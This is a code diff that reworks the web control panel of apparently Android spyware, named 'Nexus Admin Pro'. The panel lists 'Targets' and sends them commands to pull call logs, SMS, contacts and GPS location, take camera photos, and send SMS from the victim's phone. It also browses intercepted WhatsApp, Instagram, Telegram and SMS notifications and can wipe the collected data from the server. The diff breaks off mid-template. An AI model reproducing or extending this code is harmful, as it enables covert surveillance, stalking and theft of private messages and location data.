@@ -3,13 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nexus Admin Panel</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>Nexus Admin Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #0f111a;
-            --surface-color: rgba(30, 33, 48, 0.6);
+            --surface-color: rgba(30, 33, 48, 0.7);
+            --surface-hover: rgba(45, 50, 70, 0.8);
             --primary-color: #00f2fe;
             --primary-glow: rgba(0, 242, 254, 0.4);
             --secondary-color: #4facfe;
@@ -18,472 +19,440 @@
             --border: rgba(255, 255, 255, 0.1);
             --success: #10b981;
             --danger: #ef4444;
+            --warning: #f59e0b;
         }
 
-        * {
-            box-sizing: border-box; margin: 0; padding: 0;
-            font-family: 'Outfit', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; -webkit-tap-highlight-color: transparent; }
 
         body {
-            background: linear-gradient(135deg, #0f111a 0%, #1a1b26 100%);
-            color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow-x: hidden;
+            background: #0f111a; color: var(--text-main);
+            height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* Ambient Background Glow */
-        .ambient-light {
-            position: fixed;
-            top: -20%; left: -10%;
-            width: 50vw; height: 50vw;
-            border-radius: 50%;
-            background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
-            filter: blur(80px);
-            z-index: -1;
-            pointer-events: none;
+        /* Ambient Glow */
+        .ambient { position: fixed; top: -20vh; left: -20vw; width: 60vw; height: 60vw; border-radius: 50%; background: radial-gradient(circle, var(--primary-glow) 0%, transparent 60%); filter: blur(100px); z-index: -1; pointer-events: none; }
+        .ambient-2 { position: fixed; bottom: -20vh; right: -20vw; width: 60vw; height: 60vw; border-radius: 50%; background: radial-gradient(circle, rgba(79, 172, 254, 0.15) 0%, transparent 60%); filter: blur(100px); z-index: -1; pointer-events: none; }
+
+        /* Top App Bar */
+        .topbar {
+            padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
+            background: rgba(15, 17, 26, 0.9); backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border); z-index: 100;
         }
+        .logo { font-size: 1.3rem; font-weight: 700; background: linear-gradient(90deg, var(--primary-color), var(--secondary-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: flex; align-items: center; gap: 8px; }
+        .top-badge { background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px; font-size: 0.8rem; border: 1px solid var(--border); }
+
+        /* Content Area (Screens) */
+        .content-area { flex: 1; overflow-y: auto; position: relative; scrollbar-width: none; }
+        .content-area::-webkit-scrollbar { display: none; }
         
-        .ambient-light-2 {
-            position: fixed;
-            bottom: -20%; right: -10%;
-            width: 40vw; height: 40vw;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(79, 172, 254, 0.2) 0%, transparent 70%);
-            filter: blur(80px);
-            z-index: -1;
-            pointer-events: none;
-        }
+        .screen { display: none; padding: 20px; padding-bottom: 90px; animation: fadeIn 0.3s ease; }
+        .screen.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        header {
-            padding: 20px;
-            display: flex; justify-content: space-between; align-items: center;
-            backdrop-filter: blur(12px);
-            background: rgba(15, 17, 26, 0.8);
-            border-bottom: 1px solid var(--border);
-            position: sticky; top: 0; z-index: 100;
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: rgba(15, 17, 26, 0.95); backdrop-filter: blur(20px);
+            border-top: 1px solid var(--border); display: flex; justify-content: space-around;
+            padding: 10px 0 20px 0; z-index: 100;
         }
+        .nav-item {
+            display: flex; flex-direction: column; align-items: center; gap: 5px;
+            color: var(--text-muted); cursor: pointer; transition: 0.3s; width: 25%;
+        }
+        .nav-item i { font-size: 1.3rem; transition: 0.3s;}
+        .nav-item span { font-size: 0.7rem; font-weight: 500; }
+        .nav-item.active { color: var(--primary-color); }
+        .nav-item.active i { transform: translateY(-3px); text-shadow: 0 0 10px var(--primary-glow); }
 
-        .logo {
-            font-size: 1.4rem; font-weight: 700;
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: flex; align-items: center; gap: 8px;
-        }
-
-        .btn-refresh {
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--primary-color);
-            border: 1px solid var(--border);
-            padding: 8px 16px; border-radius: 20px;
-            cursor: pointer; font-weight: 600;
-            transition: all 0.3s ease;
-            display: flex; align-items: center; gap: 6px;
-        }
-
-        .btn-refresh:hover, .btn-refresh:active {
-            background: var(--primary-color); color: #000;
-            box-shadow: 0 0 15px var(--primary-glow);
-        }
-
-        .container {
-            padding: 20px; flex: 1;
-            max-width: 800px; margin: 0 auto; width: 100%;
-        }
-
-        /* Glass Cards */
-        .card {
-            background: var(--surface-color);
-            backdrop-filter: blur(16px);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 24px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-
-        .card-header {
-            font-size: 1.2rem; font-weight: 600;
-            margin-bottom: 20px; display: flex; align-items: center; gap: 10px;
-            color: var(--text-main);
-        }
-
-        /* Devices */
-        .device-item {
-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 12px; padding: 15px; margin-bottom: 15px;
-        }
-
-        .device-info {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;
-        }
+        /* Utility Components */
+        .section-title { font-size: 1.3rem; font-weight: 600; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
         
-        .device-name { font-weight: 600; font-size: 1.1rem; color: #fff;}
-        .device-id { font-size: 0.8rem; color: var(--text-muted); background: rgba(255,255,255,0.1); padding: 3px 8px; border-radius: 10px;}
-        .status-dot { height: 8px; width: 8px; background: var(--success); border-radius: 50%; display: inline-block; box-shadow: 0 0 8px var(--success); margin-right: 6px;}
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
+        .stat-card { background: var(--surface-color); border: 1px solid var(--border); border-radius: 16px; padding: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        .stat-icon { font-size: 1.5rem; color: var(--primary-color); margin-bottom: 10px; }
+        .stat-val { font-size: 2rem; font-weight: 700; margin-bottom: 5px; }
+        .stat-label { color: var(--text-muted); font-size: 0.85rem; }
 
-        .action-grid {
-            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
-        }
+        .search-bar { width: 100%; background: var(--surface-color); border: 1px solid var(--border); border-radius: 12px; padding: 12px 15px; color: #fff; font-size: 0.9rem; margin-bottom: 15px; outline: none; transition: 0.3s; }
+        .search-bar:focus { border-color: var(--primary-color); box-shadow: 0 0 15px var(--primary-glow); }
 
-        .btn-action {
-            background: rgba(255, 255, 255, 0.03);
-            color: var(--text-muted);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 10px 5px; border-radius: 8px;
-            cursor: pointer; font-size: 0.85rem; font-weight: 500;
-            transition: all 0.2s;
-            display: flex; flex-direction: column; align-items: center; gap: 6px;
-        }
-        .btn-action i { font-size: 1.2rem; color: var(--primary-color); }
-
-        .btn-action:hover, .btn-action:active {
-            background: rgba(0, 242, 254, 0.1);
-            color: #fff; border-color: rgba(0, 242, 254, 0.3);
-            transform: translateY(-2px);
-        }
-
-        /* Tabs */
-        .tabs {
-            display: flex; border-bottom: 1px solid var(--border); margin-bottom: 20px;
-            overflow-x: auto; scrollbar-width: none;
-        }
-        .tabs::-webkit-scrollbar { display: none; }
+        .list-card { background: var(--surface-color); border: 1px solid var(--border); border-radius: 12px; padding: 15px; margin-bottom: 12px; transition: 0.2s; position: relative; overflow: hidden; }
+        .list-card:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.2); }
         
-        .tab {
-            padding: 12px 20px; cursor: pointer; color: var(--text-muted);
-            font-weight: 600; white-space: nowrap; transition: 0.3s;
-            position: relative;
-        }
-        .tab.active { color: var(--primary-color); }
-        .tab.active::after {
-            content: ''; position: absolute; bottom: -1px; left: 0; width: 100%;
-            height: 2px; background: var(--primary-color);
-            box-shadow: 0 -2px 10px var(--primary-glow);
-        }
+        /* Device specific */
+        .device-header { display: flex; justify-content: space-between; margin-bottom: 15px; align-items: flex-start;}
+        .dv-name { font-weight: 600; font-size: 1.1rem; }
+        .dv-id { font-size: 0.75rem; color: var(--text-muted); background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 8px; margin-top:5px; display: inline-block;}
+        .status-badge { font-size: 0.75rem; padding: 4px 8px; border-radius: 20px; font-weight: 600; }
+        .status-online { background: rgba(16, 185, 129, 0.2); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.5); }
+        .status-offline { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.5); }
 
-        /* Lists */
-        .list-item {
-            padding: 12px; background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 10px;
-            border-left: 3px solid var(--border); transition: 0.2s;
-        }
-        .list-item:hover { border-left-color: var(--primary-color); background: rgba(255,255,255,0.03); }
-        .item-meta { font-size: 0.75rem; color: var(--text-muted); margin-bottom: 6px; display: flex; justify-content: space-between;}
-        .item-content { font-size: 0.95rem; line-height: 1.4; word-break: break-all; }
-        .item-content a { color: var(--primary-color); text-decoration: none; font-weight: 500; }
-        .item-content a:hover { text-decoration: underline; }
+        .action-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        .btn-action { background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 10px; border-radius: 8px; text-align: center; font-size: 0.75rem; cursor: pointer; transition: 0.2s; color: var(--text-muted); }
+        .btn-action i { font-size: 1.1rem; margin-bottom: 5px; color: var(--primary-color); display:block; }
+        .btn-action:hover { background: var(--primary-glow); color: #fff; border-color: var(--primary-color); }
 
-        .hidden { display: none; }
+        /* Data Items */
+        .data-meta { display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 8px; }
+        .data-content { font-size: 0.95rem; line-height: 1.4; }
+        .data-content a { color: var(--primary-color); text-decoration: none; font-weight: 500;}
+        .data-content a:hover { text-decoration: underline; }
 
-        /* Custom Prompt Overlay */
-        .overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
-            z-index: 1000; display: flex; justify-content: center; align-items: center;
-            opacity: 0; pointer-events: none; transition: 0.3s;
-        }
+        .btn-clear { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.4); padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; cursor: pointer; }
+
+        /* Toast */
+        .toast-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; gap: 10px; z-index: 2000; }
+        .toast { background: rgba(30, 33, 48, 0.95); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 10px; padding: 12px 20px; color: #fff; font-size: 0.9rem; font-weight: 500; box-shadow: 0 5px 20px rgba(0,0,0,0.5); animation: dropDown 0.3s forwards; }
+        @keyframes dropDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .empty-state { text-align: center; padding: 40px 20px; color: var(--text-muted); }
+        .empty-state i { font-size: 3rem; margin-bottom: 15px; opacity: 0.3; }
+
+        /* Filter Pills */
+        .filters { display: flex; gap: 10px; margin-bottom: 15px; overflow-x: auto; scrollbar-width: none; }
+        .filter-pill { background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 6px 15px; border-radius: 20px; font-size: 0.85rem; cursor: pointer; white-space: nowrap; }
+        .filter-pill.active { background: var(--primary-color); color: #000; border-color: var(--primary-color); font-weight: 600; }
+
+        /* Dialog */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 1000; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; transition: 0.3s; }
         .overlay.active { opacity: 1; pointer-events: auto; }
-        .dialog {
-            background: #1e2130; border: 1px solid var(--border); border-radius: 16px;
-            padding: 20px; width: 90%; max-width: 320px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-            transform: translateY(20px); transition: 0.3s;
-        }
+        .dialog { background: #1e2130; border: 1px solid var(--border); border-radius: 16px; padding: 20px; width: 90%; max-width: 320px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); transform: translateY(20px); transition: 0.3s; }
         .overlay.active .dialog { transform: translateY(0); }
-        .dialog h3 { margin-bottom: 15px; color: #fff;}
-        .dialog input {
-            width: 100%; padding: 12px; margin-bottom: 15px;
-            background: rgba(0,0,0,0.3); border: 1px solid var(--border);
-            color: #fff; border-radius: 8px; outline: none;
-        }
-        .dialog input:focus { border-color: var(--primary-color); }
-        .dialog-actions { display: flex; justify-content: flex-end; gap: 10px; }
-        .btn-dialog { padding: 10px 15px; border-radius: 8px; border: none; font-weight: 600; cursor: pointer; }
-        .btn-cancel { background: rgba(255,255,255,0.1); color: #fff; }
-        .btn-submit { background: var(--primary-color); color: #000; }
-
-        /* Toast Notifications */
-        .toast-container {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            display: flex; flex-direction: column; gap: 10px; z-index: 2000;
-        }
-        .toast {
-            background: rgba(30, 33, 48, 0.95); backdrop-filter: blur(10px);
-            border: 1px solid var(--border); border-radius: 10px;
-            padding: 12px 20px; color: #fff; font-size: 0.9rem; font-weight: 500;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
-            animation: slideUp 0.3s ease forwards;
-        }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* Loader */
-        .loader {
-            display: inline-block; width: 20px; height: 20px;
-            border: 2px solid rgba(255,255,255,0.2); border-radius: 50%;
-            border-top-color: var(--primary-color); animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .empty-state { text-align: center; padding: 30px 10px; color: var(--text-muted); }
-        .empty-state i { font-size: 2.5rem; margin-bottom: 10px; opacity: 0.5; }
-
+        .dialog input { width: 100%; padding: 12px; margin-bottom: 15px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); color: #fff; border-radius: 8px; outline: none; }
+        .btn-dialog { padding: 10px 15px; border-radius: 8px; border: none; font-weight: 600; cursor: pointer; width: 48%; }
     </style>
 </head>
 <body>
-    <div class="ambient-light"></div>
-    <div class="ambient-light-2"></div>
+    <div class="ambient"></div><div class="ambient-2"></div>
 
-    <header>
-        <div class="logo"><i class="fa-solid fa-satellite-dish"></i> Nexus Admin</div>
-        <button class="btn-refresh" onclick="fetchData(this)"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
-    </header>
-
-    <div class="container">
-        <!-- Devices Card -->
-        <div class="card">
-            <div class="card-header"><i class="fa-solid fa-mobile-screen-button" style="color: var(--primary-color);"></i> Targets Online</div>
-            <div id="deviceList"><div class="empty-state"><div class="loader"></div><p>Scanning network...</p></div></div>
-        </div>
-
-        <!-- Data Card -->
-        <div class="card" style="padding: 0; overflow: hidden;">
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab('files', this)"><i class="fa-solid fa-file-lines"></i> Logs</div>
-                <div class="tab" onclick="switchTab('notifications', this)"><i class="fa-solid fa-bell"></i> Alerts</div>
-                <div class="tab" onclick="switchTab('locations', this)"><i class="fa-solid fa-location-dot"></i> GPS</div>
-            </div>
-            
-            <div style="padding: 0 20px 20px 20px;">
-                <div id="filesList" class="tab-content"><div class="empty-state"><div class="loader"></div></div></div>
-                <div id="notificationsList" class="tab-content hidden"><div class="empty-state"><div class="loader"></div></div></div>
-                <div id="locationsList" class="tab-content hidden"><div class="empty-state"><div class="loader"></div></div></div>
-            </div>
-        </div>
+    <div class="topbar">
+        <div class="logo"><i class="fa-solid fa-satellite-dish"></i> Nexus Pro</div>
+        <div class="top-badge" id="syncStatus"><i class="fa-solid fa-rotate fa-spin"></i> Syncing</div>
     </div>
 
-    <!-- Toast Container -->
+    <div class="content-area">
+        
+        <!-- Dashboard Screen -->
+        <div class="screen active" id="screen-home">
+            <h2 class="section-title">Overview</h2>
+            <div class="stat-grid">
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fa-solid fa-mobile-screen"></i></div>
+                    <div class="stat-val" id="stat-devices">0</div>
+                    <div class="stat-label">Total Targets</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fa-solid fa-folder-open"></i></div>
+                    <div class="stat-val" id="stat-files">0</div>
+                    <div class="stat-label">Captured Files</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fa-solid fa-bell"></i></div>
+                    <div class="stat-val" id="stat-alerts">0</div>
+                    <div class="stat-label">Total Alerts</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="fa-solid fa-location-dot"></i></div>
+                    <div class="stat-val" id="stat-locations">0</div>
+                    <div class="stat-label">Location Pings</div>
+                </div>
+            </div>
+            
+            <h2 class="section-title">Quick Actions</h2>
+            <div class="list-card" style="display:flex; justify-content:space-between; align-items:center; cursor:pointer;" onclick="navTo('devices')">
+                <div>
+                    <div style="font-weight:600; margin-bottom:5px;">Command Center</div>
+                    <div style="font-size:0.8rem; color:var(--text-muted);">Send execution commands to targets</div>
+                </div>
+                <i class="fa-solid fa-chevron-right"></i>
+            </div>
+            <div class="list-card" style="display:flex; justify-content:space-between; align-items:center; cursor:pointer;" onclick="forceRefresh()">
+                <div>
+                    <div style="font-weight:600; margin-bottom:5px;">Force Server Sync</div>
+                    <div style="font-size:0.8rem; color:var(--text-muted);">Pull latest intercepted data manually</div>
+                </div>
+                <i class="fa-solid fa-arrows-rotate" id="refreshIcon"></i>
+            </div>
+        </div>
+
+        <!-- Devices Screen -->
+        <div class="screen" id="screen-devices">
+            <h2 class="section-title">Targets <span class="top-badge" id="devCount">0 Online</span></h2>
+            <input type="text" class="search-bar" id="searchDevices" placeholder="Search targets by name or ID..." oninput="renderDevices()">
+            <div id="devicesContainer"></div>
+        </div>
+
+        <!-- Files Screen -->
+        <div class="screen" id="screen-files">
+            <div class="section-title">File Logs <button class="btn-clear" onclick="clearData('files')"><i class="fa-solid fa-trash"></i> Clear</button></div>
+            <input type="text" class="search-bar" id="searchFiles" placeholder="Search logged files..." oninput="renderFiles()">
+            <div id="filesContainer"></div>
+        </div>
+
+        <!-- Alerts Screen (Notifications & GPS) -->
+        <div class="screen" id="screen-alerts">
+            <div class="section-title">Intelligence <button class="btn-clear" onclick="clearData(activeAlertTab)"><i class="fa-solid fa-trash"></i> Clear</button></div>
+            <div class="filters" id="mainAlertFilters">
+                <div class="filter-pill active" onclick="switchAlertTab('notifications', this)">SMS/Notifications</div>
+                <div class="filter-pill" onclick="switchAlertTab('locations', this)">GPS Tracking</div>
+            </div>
+            
+            <div id="appFilters" class="filters" style="margin-top:-5px; margin-bottom:15px; display:flex;">
+                <div class="filter-pill active" style="font-size: 0.75rem; padding: 4px 10px;" onclick="setAppFilter('all', this)">All</div>
+                <div class="filter-pill" style="font-size: 0.75rem; padding: 4px 10px;" onclick="setAppFilter('whatsapp', this)"><i class="fa-brands fa-whatsapp"></i> WhatsApp</div>
+                <div class="filter-pill" style="font-size: 0.75rem; padding: 4px 10px;" onclick="setAppFilter('instagram', this)"><i class="fa-brands fa-instagram"></i> Instagram</div>
+                <div class="filter-pill" style="font-size: 0.75rem; padding: 4px 10px;" onclick="setAppFilter('telegram', this)"><i class="fa-brands fa-telegram"></i> Telegram</div>
+                <div class="filter-pill" style="font-size: 0.75rem; padding: 4px 10px;" onclick="setAppFilter('sms', this)"><i class="fa-solid fa-message"></i> SMS</div>
+            </div>
+            <input type="text" class="search-bar" id="searchAlerts" placeholder="Search intel database..." oninput="renderAlerts()">
+            
+            <div id="notificationsContainer"></div>
+            <div id="locationsContainer" style="display:none;"></div>
+        </div>
+
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="navTo('home', this)"><i class="fa-solid fa-chart-pie"></i><span>Dashboard</span></div>
+        <div class="nav-item" onclick="navTo('devices', this)"><i class="fa-solid fa-network-wired"></i><span>Targets</span></div>
+        <div class="nav-item" onclick="navTo('files', this)"><i class="fa-solid fa-folder-tree"></i><span>Logs</span></div>
+        <div class="nav-item" onclick="navTo('alerts', this)"><i class="fa-solid fa-shield-halved"></i><span>Intel</span></div>
+    </div>
+
     <div class="toast-container" id="toastContainer"></div>
 
-    <!-- Custom Prompt for SMS -->
     <div class="overlay" id="smsDialog">
         <div class="dialog">
-            <h3><i class="fa-solid fa-comment-sms"></i> Send Command</h3>
-            <input type="text" id="smsTo" placeholder="Target Phone Number (e.g. +9198...)">
-            <input type="text" id="smsBody" placeholder="Message content...">
+            <h3 style="color:#fff; margin-bottom:15px;"><i class="fa-solid fa-comment-sms"></i> Remote SMS Proxy</h3>
+            <input type="text" id="smsTo" placeholder="Target Phone Number (+91...)">
+            <input type="text" id="smsBody" placeholder="Message content">
             <input type="hidden" id="smsDeviceId">
-            <div class="dialog-actions">
-                <button class="btn-dialog btn-cancel" onclick="closeDialog()">Cancel</button>
-                <button class="btn-dialog btn-submit" onclick="submitSms()">Send</button>
+            <div style="display:flex; justify-content:space-between;">
+                <button class="btn-dialog" style="background:rgba(255,255,255,0.1); color:#fff;" onclick="document.getElementById('smsDialog').classList.remove('active')">Cancel</button>
+                <button class="btn-dialog" style="background:var(--primary-color); color:#000;" onclick="submitSms()">Execute</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Data stores
         let localData = {
             devices: JSON.parse(localStorage.getItem('nexus_devices')) || [],
             files: JSON.parse(localStorage.getItem('nexus_files')) || [],
             notifications: JSON.parse(localStorage.getItem('nexus_notifications')) || [],
             locations: JSON.parse(localStorage.getItem('nexus_locations')) || []
         };
+        let activeAlertTab = 'notifications';
 
-        function showToast(message) {
+        function showToast(msg) {
             const container = document.getElementById('toastContainer');
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `<i class="fa-solid fa-circle-info" style="color: var(--primary-color); margin-right: 8px;"></i> ${message}`;
+            const toast = document.createElement('div'); toast.className = 'toast';
+            toast.innerHTML = `<i class="fa-solid fa-bolt" style="color:var(--primary-color);margin-right:8px;"></i> ${msg}`;
             container.appendChild(toast);
-            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 3000);
+            setTimeout(() => { toast.remove(); }, 3000);
         }
 
-        // Handle sending regular commands
+        function triggerNative(title, msg) {
+            if (window.Android && window.Android.showNotification) {
+                window.Android.showNotification(title, msg);
+            } else {
+                showToast(title + ": " + msg);
+            }
+        }
+
+        function timeAgo(ms) {
+            const seconds = Math.floor((new Date() - new Date(ms)) / 1000);
+            if (seconds < 60) return "Just now";
+            const minutes = Math.floor(seconds / 60);
+            if (minutes < 60) return `${minutes}m ago`;
+            const hours = Math.floor(minutes / 60);
+            if (hours < 24) return `${hours}h ago`;
+            return new Date(ms).toLocaleDateString();
+        }
+
+        function navTo(screenId, el) {
+            if(el) {
+                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+                el.classList.add('active');
+            } else {
+                document.querySelectorAll('.nav-item').forEach(n => {
+                    if(n.querySelector('span').innerText.toLowerCase() === screenId || 
+                      (screenId==='alerts' && n.querySelector('span').innerText==='Intel')||
+                      (screenId==='files' && n.querySelector('span').innerText==='Logs')) n.classList.add('active');
+                });
+            }
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById('screen-' + screenId).classList.add('active');
+            renderAll();
+        }
+
+        function switchAlertTab(tab, el) {
+            activeAlertTab = tab;
+            el.parentElement.querySelectorAll('.filter-pill').forEach(f => f.classList.remove('active'));
+            el.classList.add('active');
+            
+            document.getElementById('appFilters').style.display = tab === 'notifications' ? 'flex' : 'none';
+            document.getElementById('notificationsContainer').style.display = tab === 'notifications' ? 'block' : 'none';
+            document.getElementById('locationsContainer').style.display = tab === 'locations' ? 'block' : 'none';
+            renderAlerts();
+        }
+
+        let currentAppFilter = 'all';
+        function setAppFilter(app, el) {
+            currentAppFilter = app;
+            document.getElementById('appFilters').querySelectorAll('.filter-pill').forEach(f => f.classList.remove('active'));
+            el.classList.add('active');
+            renderAlerts();
+        }
+
         function sendCommand(deviceId, command) {
-            fetch('/admin/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId, command })
-            }).then(res => res.json()).then(data => {
-                showToast(data.message || data.error);
-            }).catch(e => showToast("Network Error"));
+            fetch('/admin/command', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({deviceId, command}) })
+            .then(r=>r.json()).then(d=>showToast(d.message||d.error)).catch(e=>showToast('Error dispatching cmd'));
         }
 
-        // Handle SMS prompt
         function promptSms(deviceId) {
             document.getElementById('smsDeviceId').value = deviceId;
-            document.getElementById('smsTo').value = '';
-            document.getElementById('smsBody').value = '';
             document.getElementById('smsDialog').classList.add('active');
-            document.getElementById('smsTo').focus();
-        }
-
-        function closeDialog() {
-            document.getElementById('smsDialog').classList.remove('active');
         }
 
         function submitSms() {
             const deviceId = document.getElementById('smsDeviceId').value;
             const smsTo = document.getElementById('smsTo').value;
             const smsBody = document.getElementById('smsBody').value;
-            
-            if(!smsTo || !smsBody) {
-                showToast("Please fill all fields");
-                return;
+            if(!smsTo) return showToast("Target number required");
+            fetch('/admin/command', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({deviceId, command:'ms', smsTo, smsBody}) })
+            .then(r=>r.json()).then(d=>{ showToast(d.message||d.error); document.getElementById('smsDialog').classList.remove('active'); });
+        }
+
+        function clearData(type) {
+            if(confirm('Wipe ' + type + ' history from server?')) {
+                fetch('/admin/clear', { method: 'DELETE', headers: {'Content-Type':'application/json'}, body: JSON.stringify({type}) })
+                .then(r=>r.json()).then(d => {
+                    if(d.success) { localData[type] = []; renderAll(); showToast(type + ' wiped securely.'); }
+                });
             }
-
-            fetch('/admin/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId, command: 'ms', smsTo, smsBody })
-            }).then(res => res.json()).then(data => {
-                showToast(data.message || data.error);
-                closeDialog();
-            }).catch(e => showToast("Network Error"));
         }
 
-        function formatTime(ms) {
-            return new Date(ms).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+        function renderAll() {
+            document.getElementById('stat-devices').innerText = localData.devices.length;
+            document.getElementById('stat-files').innerText = localData.files.length;
+            document.getElementById('stat-alerts').innerText = localData.notifications.length;
+            document.getElementById('stat-locations').innerText = localData.locations.length;
+            document.getElementById('devCount').innerText = `${localData.devices.length} Online`;
+            renderDevices(); renderFiles(); renderAlerts();
         }
 
-        function renderData() {
-            // Render Devices
-            const devContainer = document.getElementById('deviceList');
-            if (localData.devices.length === 0) {
-                devContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-mobile-screen"></i><p>No devices currently online</p></div>`;
-            } else {
-                devContainer.innerHTML = localData.devices.map(d => `
-                    <div class="device-item">
-                        <div class="device-info">
-                            <div>
-                                <span class="status-dot"></span>
-                                <span class="device-name">${d.name}</span>
-                            </div>
-                            <span class="device-id">${d.id.substring(0,8)}...</span>
+        function renderDevices() {
+            const q = document.getElementById('searchDevices').value.toLowerCase();
+            const filtered = localData.devices.filter(d => d.name.toLowerCase().includes(q) || d.id.toLowerCase().includes(q));
+            const c = document.getElementById('devicesContainer');
+            if(!filtered.length) return c.innerHTML = `<div class="empty-state"><i class="fa-solid fa-ghost"></i><p>No active targets found.</p></div>`;
+            c.innerHTML = filtered.map(d => {
+                const isOnline = (Date.now() - d.lastSeen) < 60000;
+                return `
+                <div class="list-card">
+                    <div class="device-header">
+                        <div>
+                            <div class="dv-name">${d.name}</div>
+                            <div class="dv-id">ID: ${d.id.substring(0,8)}...</div>
                         </div>
-                        <div class="action-grid">
-                            <div class="btn-action" onclick="sendCommand('${d.id}', 'ch')"><i class="fa-solid fa-phone-flip"></i> Call Logs</div>
-                            <div class="btn-action" onclick="sendCommand('${d.id}', 'as')"><i class="fa-solid fa-comments"></i> In/Out SMS</div>
-                            <div class="btn-action" onclick="sendCommand('${d.id}', 'loc')"><i class="fa-solid fa-location-crosshairs"></i> Get GPS</div>
-                            <div class="btn-action" onclick="sendCommand('${d.id}', 'cf')"><i class="fa-solid fa-camera"></i> Snap Photo</div>
-                            <div class="btn-action" onclick="promptSms('${d.id}')"><i class="fa-solid fa-paper-plane"></i> Send SMS</div>
-                            <div class="btn-action" onclick="sendCommand('${d.id}', 'contact')"><i class="fa-solid fa-address-book"></i> Contacts</div>
+                        <div class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">
